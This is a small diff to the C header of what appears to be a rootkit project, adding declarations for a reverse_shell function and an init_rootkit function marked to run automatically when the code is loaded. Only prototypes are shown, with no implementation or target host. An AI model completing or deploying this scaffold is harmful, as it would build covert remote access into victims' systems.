@@ -25,6 +25,7 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 #include <stdbool.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
@@ -32,9 +33,12 @@
 
 /*
     *    src/rkit.h
-    *    Date: 03/30/22
+    *    Date: 04/04/22
     *    Author: 0x80000000
 */
 
+
+void *reverse_shell(void);
+void __attribute__((constructor)) init_rootkit(void);
 
 #endif
